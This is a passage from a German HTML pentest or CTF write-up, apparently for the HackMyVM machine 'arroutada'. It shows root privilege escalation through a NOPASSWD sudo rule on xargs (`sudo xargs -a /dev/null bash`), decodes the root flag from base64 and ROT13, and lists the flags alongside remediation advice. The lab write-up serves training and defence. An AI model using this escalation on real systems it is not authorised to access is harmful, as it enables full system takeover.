+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User drito may run the following commands on arroutada:
+    (ALL : ALL) NOPASSWD: /usr/bin/xargs</pre>
+                 </div>
+             </div>
+
+            <!-- POC Abschnitt 2 beginnt hier -->
+            <section id="poc-root">
+                <h2>Proof of Concept (Privilege Escalation zu Root via 'sudo xargs')</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `drito` hat `sudo`-Rechte, um `/usr/bin/xargs` ohne Passwort auszuführen. Dies kann ausgenutzt werden, um eine interaktive Root-Shell zu starten.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Shell-Zugriff als Benutzer `drito`.</li>
+                        <li>Fehlkonfigurierte `sudo`-Regel: `(ALL : ALL) NOPASSWD: /usr/bin/xargs`.</li>
+                    </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                <p class="analysis"><strong>1. Ausnutzen von 'sudo xargs':</strong> Der Befehl `sudo xargs -a /dev/null bash` wird ausgeführt.
+                *   `sudo xargs`: Führt `xargs` mit Root-Rechten aus.
+                *   `-a /dev/null`: Weist `xargs` an, seine Eingabe aus `/dev/null` (einer leeren Datei) zu lesen, anstatt auf Standardeingabe zu warten.
+                *   `bash`: Der Befehl, den `xargs` ausführen soll. Da die Eingabe leer ist, führt `xargs` einfach `bash` einmal aus - aber mit den Rechten, die es durch `sudo` erhalten hat (Root).
+                </p>
+                <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich! Der Prompt ändert sich zu `root@arroutada:/home/drito/web#`. Der Befehl `id` bestätigt `uid=0(root)`. Volle Root-Rechte wurden erlangt.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lesen Sie die Root-Flag.
+                <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel für `xargs`.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">drito@arroutada:~/web$ <span class="command">sudo xargs -a /dev/null bash</span></div>
+                          <div class="prompt">root@arroutada:/home/drito/web# <span class="command">id</span></div>
+                          <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                          <div class="prompt">root@arroutada:/home/drito/web# <span class="command">cd ~</span></div>
+                          <div class="prompt">root@arroutada:~# <span class="command">ls</span></div>
+                          <pre>dead.letter  root.txt</pre>
+                          <div class="prompt">root@arroutada:~# <span class="command">cat root.txt</span></div>
+                          <pre><span class="password">R3VuYXhmR2JGenlOYXFOeXlVbnB4WmxJWg==</span></pre>
+                     </div>
+                 </div>
+                 <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die fehlkonfigurierte `sudo`-Regel ermöglicht einem Benutzer mit normalen Rechten die vollständige Übernahme des Systems als Root.</p>
+                 <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie die Zeile `drito ALL=(ALL : ALL) NOPASSWD: /usr/bin/xargs` aus der `/etc/sudoers`-Datei (oder der entsprechenden Datei in `/etc/sudoers.d/`).</li>
+                        <li>Überprüfen Sie alle `sudo`-Regeln auf ähnliche unsichere Konfigurationen, insbesondere solche mit `NOPASSWD` und Befehlen, die zur Ausführung anderer Befehle missbraucht werden können.</li>
+                    </ol>
+                 </p>
+            </section> <!-- POC Abschnitt 2 endet hier -->
+
+             <p class="analysis"><strong>Analyse:</strong> Die aus `/root/root.txt` gelesene Zeichenkette scheint kodiert zu sein. Sie wird mit `base64 -d` dekodiert und das Ergebnis (`GunaxfGbFzyNaqNyyUnpxZlIZ`) anschließend durch eine ROT13-Verschiebung (`tr 'A-Za-z' 'N-ZA-Mn-za-m'`) geleitet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Dekodierung ist erfolgreich. Die finale Root-Flag lautet `<span class="password">ThanksToSmlAndAllHackMyVM</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die finale Flag.
+             <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie unnötige Kodierung oder Verschleierung von Flags oder sensiblen Daten.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">root@arroutada:~# <span class="command">echo -n "R3VuYXhmR2JGenlOYXFOeXlVbnB4WmxJWg==" | base64 -d</span></div>
+                       <pre>GunaxfGbFzyNaqNyyUnpxZlIZ</pre> <!-- Ausgabe von base64 -->
+                       <div class="prompt">root@arroutada:~# <span class="command">echo "GunaxfGbFzyNaqNyyUnpxZlIZ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</span></div>
+                       <pre><span class="password">ThanksToSmlAndAllHackMyVM</span></pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                      <!-- Annahme: User-Flag-Pfad, da Befehl nicht im Text war -->
+                     <div class="flag-command">cat /home/drito/user.txt</div>
+                     <div class="flag-value"><span class="password">785f64437c6e1f9af6aa1afcc91ed27c</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'</div>
+                     <div class="flag-value"><span class="password">ThanksToSmlAndAllHackMyVM</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-08</p>
+    </footer>
+</body>
+</html>
